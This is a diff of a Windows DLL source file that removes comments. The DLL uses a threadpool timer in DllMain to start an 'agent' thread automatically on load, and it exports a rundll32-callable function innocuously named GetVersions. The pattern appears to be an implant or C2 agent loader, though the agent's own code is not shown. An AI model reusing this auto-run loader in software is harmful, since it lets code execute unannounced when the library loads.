@@ -77,12 +77,10 @@ int main()
 #define _WIN32_WINNT 0x0600
 #include <threadpoolapiset.h>
 
-// Global synchronization primitives
 static volatile LONG g_AgentInitialized = FALSE;
 static volatile LONG g_LockInitialized = FALSE;
 static CRITICAL_SECTION g_InitLock;
 
-// Initialize critical section during DLL load
 void InitializeSynchronization()
 {
     if (InterlockedCompareExchange(&g_LockInitialized, TRUE, FALSE) == FALSE)
@@ -91,29 +89,25 @@ void InitializeSynchronization()
 
 void run()
 {
-    // Initialize synchronization if needed
     InitializeSynchronization();
 
-    // Attempt to acquire initialization ownership
     if (InterlockedCompareExchange(&g_AgentInitialized, TRUE, FALSE) == FALSE) {
-        // Create agent thread without blocking
         HANDLE hThread = CreateThread(NULL, 0, AgentMain, NULL, 0, NULL);
         if (hThread)
-            CloseHandle(hThread); // Detach thread for asynchronous execution
+            CloseHandle(hThread);
         else
-            InterlockedExchange(&g_AgentInitialized, FALSE); // Reset flag on failure to allow retry
+            InterlockedExchange(&g_AgentInitialized, FALSE);
     }
 }
 
 extern "C" __attribute__((dllexport)) void CALLBACK GetVersions(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
 {
-    // Mark as directly called to prevent automatic execution
     InitializeSynchronization();
 
     if (InterlockedCompareExchange(&g_AgentInitialized, TRUE, FALSE) == FALSE) {
         HANDLE hThread = CreateThread(NULL, 0, AgentMain, NULL, 0, NULL);
         if (hThread) {
-            WaitForSingleObject(hThread, INFINITE); // Wait for thread completion when called directly
+            WaitForSingleObject(hThread, INFINITE);
             CloseHandle(hThread);
         }
     }
@@ -121,7 +115,6 @@ extern "C" __attribute__((dllexport)) void CALLBACK GetVersions(HWND hwnd, HINST
 
 VOID CALLBACK InitializationCallback(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_TIMER Timer)
 {
-    // Execute initialization without loader lock constraints
     CloseThreadpoolTimer(Timer);
     run();
 }
@@ -131,10 +124,7 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReser
     switch (ul_reason_for_call) {
     case DLL_PROCESS_ATTACH:
     {
-        // Initialize synchronization on first load
         InitializeSynchronization();
-
-        // Create scope block to contain variable declarations
         PTP_TIMER timer = CreateThreadpoolTimer(InitializationCallback, NULL, NULL);
         if (timer) {
             FILETIME dueTime = { 0 };
@@ -143,7 +133,6 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReser
         break;
     }
     case DLL_PROCESS_DETACH:
-        // Cleanup if loader allows
         if (!lpReserved && g_LockInitialized)
             DeleteCriticalSection(&g_InitLock);
         break;
